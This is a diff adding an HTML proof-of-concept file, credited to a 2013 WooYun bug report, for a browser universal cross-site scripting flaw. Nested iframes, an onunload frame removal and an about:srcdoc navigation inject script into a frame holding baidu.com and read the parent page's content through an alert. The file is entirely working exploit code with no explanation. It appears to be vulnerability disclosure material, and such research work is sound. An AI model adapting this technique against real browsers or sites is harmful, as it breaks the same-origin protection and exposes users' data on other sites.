@@ -1,0 +1,21 @@
+via http://www.wooyun.org/bugs/wooyun-2013-047388
+<body>
+<script>
+	parentFrame = document.body.appendChild(document.createElement("iframe"));
+	helperFrame1 = parentFrame.contentDocument.body.appendChild(document.createElement("iframe"));
+	helperFrame1.contentWindow.onunload = function() {
+		container = document.createElement("div");
+		targetFrame  = container.appendChild(document.createElement("iframe"));
+		helperFrame2 = targetFrame.appendChild(document.createElement("iframe"));
+		helperFrame2.src = "javascript:top.container.removeChild(top.targetFrame)";
+		parentFrame.contentDocument.body.appendChild(container);
+	}
+	parentFrame.src = "http://www.baidu.com/";
+	parentFrame.onload = function() {
+		parentFrame.onload = null;
+
+		targetFrame.srcdoc = "<script>alert(parent.document.body.innerHTML)<\/script>";
+		targetFrame.contentWindow.location = "about:srcdoc";
+	}
+</script>
+</body>
